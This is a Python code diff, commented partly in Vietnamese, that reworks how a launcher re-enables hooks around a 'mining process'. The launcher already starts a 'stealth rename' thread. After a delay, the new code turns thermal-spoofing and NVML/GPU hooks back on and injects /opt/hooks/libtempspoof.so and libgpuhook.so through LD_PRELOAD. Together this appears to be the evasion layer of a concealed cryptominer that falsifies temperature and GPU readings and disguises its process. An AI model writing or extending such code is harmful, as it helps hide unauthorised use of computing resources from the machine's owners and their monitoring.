@@ -244,146 +244,45 @@ def main():
                 threading.Thread(target=_enhanced_stealth_rename, daemon=True).start()
                 
                 # ====================================
-                # PHASE 3+: Enhanced Hook Sequencing 
-                # Kết hợp static delay + dynamic detection
+                # LINEAR FLOW: Simplified Hook Sequencing 
                 # ====================================
                 
-                def _enhanced_hook_sequencing():
+                def _simplified_hook_sequencing():
                     """
-                    PHASE 3+ Enhanced Hook Sequencing (sắp xếp hook nâng cao)
-                    Kết hợp PHASE 3 (static delay) + PHASE 1.5 (dynamic detection)
+                    Simplified Hook Sequencing cho Linear Flow
                     """
                     try:
-                        # PHASE 3: Initial static delay (minimum wait time)
-                        initial_delay = 10  # seconds
-                        logger.info(f"🕒 [PHASE3+] Initial delay {initial_delay}s for basic memory allocation")
-                        time.sleep(initial_delay)
+                        # Simple delay for memory allocation
+                        logger.info("🕒 [HOOK-SEQ] Waiting for memory allocation (20s)")
+                        time.sleep(20)
                         
-                        # PHASE 1.5: Dynamic DAG completion detection (if psutil available)
-                        dag_completed = False
-                        if PSUTIL_AVAILABLE:
-                            logger.info("🔍 [PHASE3+] Starting dynamic DAG completion detection")
-                            
-                            max_detection_time = 50  # Additional 50s for dynamic detection
-                            detection_interval = 5
-                            stable_cycles = 0
-                            required_stability = 3  # 15 seconds of stability
-                            last_memory = None
-                            
-                            for attempt in range(max_detection_time // detection_interval):
-                                try:
-                                    # Check if mining process still exists
-                                    if process.poll() is not None:
-                                        logger.error("❌ [PHASE3+] Mining process terminated during hook sequencing")
-                                        return False
-                                        
-                                    # Monitor memory stability
-                                    process_obj = psutil.Process(process.pid)
-                                    memory_percent = process_obj.memory_percent()
-                                    
-                                    if last_memory is not None:
-                                        memory_change = abs(memory_percent - last_memory)
-                                        
-                                        if memory_change < 2.0:  # Less than 2% change
-                                            stable_cycles += 1
-                                            logger.debug(f"🟢 [PHASE3+] Memory stable cycle {stable_cycles}/{required_stability}")
-                                            
-                                            if stable_cycles >= required_stability:
-                                                dag_completed = True
-                                                logger.info("✅ [PHASE3+] DAG generation completed - memory usage stabilized")
-                                                break
-                                        else:
-                                            stable_cycles = 0
-                                            logger.debug(f"🟡 [PHASE3+] Memory change: {memory_change:.1f}% - resetting stability counter")
-                                    
-                                    last_memory = memory_percent
-                                    time.sleep(detection_interval)
-                                    
-                                except psutil.NoSuchProcess:
-                                    logger.error("❌ [PHASE3+] Mining process no longer exists")
-                                    return False
-                                except Exception as e:
-                                    logger.debug(f"⚠️ [PHASE3+] Detection error: {e}")
-                                    break
-                        else:
-                            # Fallback to extended static delay if psutil unavailable
-                            logger.info("🕒 [PHASE3+] psutil unavailable - using extended static delay")
-                            time.sleep(30)  # Extended static delay
-                            dag_completed = True  # Assume completed
+                        # Re-enable hooks directly
+                        os.environ['THERMAL_SPOOF_DISABLED'] = '0'
+                        os.environ['NVML_HOOK_DISABLED'] = '0'
+                        os.environ['GPU_HOOK_DISABLED'] = '0'
                         
-                        # Gradual hook re-activation
-                        if dag_completed:
-                            logger.info("🚀 [PHASE3+] Starting gradual hook re-activation")
-                        else:
-                            logger.warning("⚠️ [PHASE3+] DAG detection timeout - proceeding with caution")
+                        # Restore LD_PRELOAD simply
+                        thermal_lib = '/opt/hooks/libtempspoof.so'
+                        gpu_lib = '/opt/hooks/libgpuhook.so'
                         
-                        # Re-enable hooks gradually
-                        try:
-                            # Step 1: Re-enable less memory-intensive hooks first
-                            time.sleep(2)
-                            os.environ['THERMAL_SPOOF_DISABLED'] = '0'
-                            logger.info("🌡️ [PHASE3+] Thermal spoofing re-enabled")
+                        preload_libs = [lib for lib in [thermal_lib, gpu_lib] if os.path.exists(lib)]
+                        
+                        if preload_libs:
+                            os.environ['LD_PRELOAD'] = ':'.join(preload_libs)
                             
-                            # Step 2: Re-enable NVML hooks
-                            time.sleep(3)
-                            os.environ['NVML_HOOK_DISABLED'] = '0'
-                            os.environ['GPU_HOOK_DISABLED'] = '0'
-                            logger.info("📊 [PHASE3+] NVML hooks re-enabled")
-                            
-                            # Step 3: Restore LD_PRELOAD selectively
-                            time.sleep(2)
-                            thermal_lib = '/opt/hooks/libtempspoof.so'
-                            gpu_lib = '/opt/hooks/libgpuhook.so'
-                            
-                            preload_libs = []
-                            if os.path.exists(thermal_lib):
-                                preload_libs.append(thermal_lib)
-                            if os.path.exists(gpu_lib):
-                                preload_libs.append(gpu_lib)
-                                
-                            if preload_libs:
-                                os.environ['LD_PRELOAD'] = ':'.join(preload_libs)
-                                logger.info(f"🔗 [PHASE3+] LD_PRELOAD restored: {os.environ['LD_PRELOAD']}")
-                            
-                            logger.info("✅ [PHASE3+] Enhanced hook sequencing completed successfully")
-                            return True
-                            
-                        except Exception as e:
-                            logger.error(f"❌ [PHASE3+] Hook re-activation failed: {e}")
-                            return False
-                            
-                    except Exception as main_err:
-                        logger.error(f"❌ [PHASE3+] Enhanced hook sequencing failed: {main_err}")
+                        logger.info("✅ [HOOK-SEQ] Hook sequencing completed")
+                        return True
+                        
+                    except Exception as e:
+                        logger.error(f"❌ [HOOK-SEQ] Failed: {e}")
                         return False
                 
-                # PHASE 3++: Tích hợp Hook Coordinator để đồng bộ với Resource Manager
-                def _coordinated_hook_sequencing():
-                    """
-                    PHASE 3++ Coordinated Hook Sequencing (phối hợp với Resource Manager)
-                    """
-                    # Run PHASE 3+ logic
-                    hook_success = _enhanced_hook_sequencing()
-                    
-                    # Notify Hook Coordinator về completion
-                    if hook_success:
-                        try:
-                            # Import Hook Coordinator
-                            sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
-                            from coordinator import get_hook_coordinator
-                            
-                            coordinator = get_hook_coordinator()
-                            coordinator.notify_hooks_ready(process.pid)
-                            
-                            logger.info("✅ [PHASE3++] Hook Coordinator notified of completion")
-                            
-                        except Exception as coord_err:
-                            logger.error(f"❌ [PHASE3++] Hook Coordinator notification failed: {coord_err}")
-                            # Continue anyway - hooks are still re-enabled
-                    
-                # Start PHASE 3++ Coordinated Hook Sequencing in background
-                threading.Thread(target=_coordinated_hook_sequencing, daemon=True).start()
-                logger.info("🚀 [PHASE3++] Coordinated Hook Sequencing started in background")
-                # 🚀 **LINEAR FLOW: DIRECT HANDOFF TO HOOKCOORDINATOR** (luồng tuyến tính: chuyển giao trực tiếp đến HookCoordinator)
+                # Start simplified hook sequencing in background
+                threading.Thread(target=_simplified_hook_sequencing, daemon=True).start()
+                logger.info("🚀 [LINEAR-FLOW] Simplified hook sequencing started")
+                
+                # REMOVED: Duplicate coordination method - using linear flow only
+                # 🚀 **LINEAR FLOW: PRIMARY HANDOFF TO HOOKCOORDINATOR** (luồng tuyến tính: chuyển giao chính đến HookCoordinator)
                 try:
                     # **Import HookCoordinator FIRST** (nhập HookCoordinator TRƯỚC TIÊN)
                     sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'coordination'))
